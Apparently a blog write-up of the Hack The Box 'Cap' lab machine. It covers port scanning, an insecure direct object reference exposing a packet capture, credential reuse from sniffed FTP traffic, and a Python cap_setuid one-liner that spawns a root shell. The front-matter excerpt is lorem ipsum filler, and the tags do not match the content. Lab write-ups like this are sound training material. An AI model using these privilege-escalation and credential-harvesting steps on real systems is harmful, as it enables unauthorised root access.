---
layout: single
title: Cap - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-06-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-cap/cap_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-cap/cap_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/cap]# nmap -Pn -n -sCV --open 10.10.10.245
  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
  |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
  |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
  80/tcp open  http    gunicorn
  | fingerprint-strings:
  |   FourOhFourRequest:
  |     HTTP/1.0 404 NOT FOUND
  |     Server: gunicorn
  |     Date: Fri, 18 Jun 2021 07:14:58 GMT
  |     Connection: close
  |     Content-Type: text/html; charset=utf-8
  |     Content-Length: 232
  |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
  |     <title>404 Not Found</title>
  |     <h1>Not Found</h1>
  |     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
  |   GetRequest:
  |     HTTP/1.0 200 OK
  |     Server: gunicorn
  |     Date: Fri, 18 Jun 2021 07:14:52 GMT
  |     Connection: close
  |     Content-Type: text/html; charset=utf-8
  |     Content-Length: 19386
  |     <!DOCTYPE html>
  |     <html class="no-js" lang="en">
  |     <head>
  |     <meta charset="utf-8">
  |     <meta http-equiv="x-ua-compatible" content="ie=edge">
  |     <title>Security Dashboard</title>
  |     <meta name="viewport" content="width=device-width, initial-scale=1">
  |     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
  |     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
  |     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
  |     <link rel="stylesheet" href="/static/css/themify-icons.css">
  |     <link rel="stylesheet" href="/static/css/metisMenu.css">
  |     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
  |     <link rel="stylesheet" href="/static/css/slicknav.min.css">
  |     <!-- amchar
  |   HTTPOptions:
  |     HTTP/1.0 200 OK
  |     Server: gunicorn
  |     Date: Fri, 18 Jun 2021 07:14:52 GMT
  |     Connection: close
  |     Content-Type: text/html; charset=utf-8
  |     Allow: OPTIONS, GET, HEAD
  |     Content-Length: 0
  |   RTSPRequest:
  |     HTTP/1.1 400 Bad Request
  |     Connection: close
  |     Content-Type: text/html
  |     Content-Length: 196
  |     <html>
  |     <head>
  |     <title>Bad Request</title>
  |     </head>
  |     <body>
  |     <h1><p>Bad Request</p></h1>
  |     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
  |     </body>
  |_    </html>
  |_http-server-header: gunicorn
  |_http-title: Security Dashboard


DIRB
+ http://10.10.10.245/data (CODE:302|SIZE:208)
+ http://10.10.10.245/ip (CODE:200|SIZE:17451)
+ http://10.10.10.245/netstat (CODE:200|SIZE:30019)

NIKTO
+ Allowed HTTP Methods: OPTIONS, GET, HEAD

User - Nathan


1. Visiting the HTTP we instantly see user 'Nathan', and a few IP functions - netstat, ifconfig and a capture counter. The capture
have all it's values to 0, and whatever we do towards the host they don't move.

Looking at the url, http://10.10.10.245/data/1, we can change the value '1' to '0' in hope to find a earlier batch of data.
This work and we can see that the counters are now 72,69,69,0. Download the .pcap file and go through it in Wireshark.


2. Once opened the .pcap we can quickly see requests and responses regarding user Nathan. Right click, Follow > TCP Stream and we
get this output:

  220 (vsFTPd 3.0.3)
  USER nathan
  331 Please specify the password.
  PASS Buck3tH4TF0RM3!
  230 Login successful.
  SYST
  215 UNIX Type: L8
  PORT 192,168,196,1,212,140
  200 PORT command successful. Consider using PASV.
  LIST
  150 Here comes the directory listing.
  226 Directory send OK.
  PORT 192,168,196,1,212,141
  200 PORT command successful. Consider using PASV.
  LIST -al
  150 Here comes the directory listing.
  226 Directory send OK.
  TYPE I
  200 Switching to Binary mode.
  PORT 192,168,196,1,212,143
  200 PORT command successful. Consider using PASV.
  RETR notes.txt
  550 Failed to open file.
  QUIT
  221 Goodbye.

Sweet, we now have creds to vsFTP! Nathan:Buck3tH4TF0RM3!
Before digging deeper into vsFTP, I always tend to try the creds towards SSH incase that would give us a easy user.

  [root:/git/htb/cap]# ssh nathan@10.10.10.245                                                                                      (master✱)
  nathan@10.10.10.245's password: Buck3tH4TF0RM3!
    nathan@cap:~$ whoami
      nathan
    nathan@cap:~$ cat user.txt
      ae160eb3719c987efe6e0eebaf2a6574

Easy user, great!


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. As usual, start with the easy 'sudo -l' to see if we can get easy root.

  nathan@cap:~$ sudo -l
    [sudo] password for nathan:
    Sorry, user nathan may not run sudo on cap.

No luck, after some manual enumeration I couldn't find anything obvious - so fire up linpeas.

  nathan@cap:/dev/shm$ ./linpeas.sh
    ..
    [+] Capabilities
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
    /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
    /usr/bin/ping = cap_net_raw+ep
    /usr/bin/traceroute6.iputils = cap_net_raw+ep
    /usr/bin/mtr-packet = cap_net_raw+ep
    /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

Capabilities is new to me, something I've never heard about and fits the name of the box 'Cap'.
Reading about Capabilities we find:
  > Capabilities are useful when you want to restrict your own processes after performing privileged operations
  > (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious
  > commands or arguments which are then run as root.

  CAP_SETUID =            Allow changing of the UID (set UID of root in you process)
  CAP_NET_BIND_SERVICE =  Bind a socket to internet domain privileged ports
  CAP_NET_RAW =           Use RAW and PACKET sockets (sniff traffic)

With this knowledge, python3.8 has the capabilities to setuid to 0, giving us root access.
We can do this in a simple one-liner.

  nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
  root@cap:~# id && cat /root/root.txt
  uid=0(root) gid=1001(nathan) groups=1001(nathan)
  cd9a6e65fc62abbc53c91c6f7b803822


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Exploit Capabilities:
  https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#malicious-use
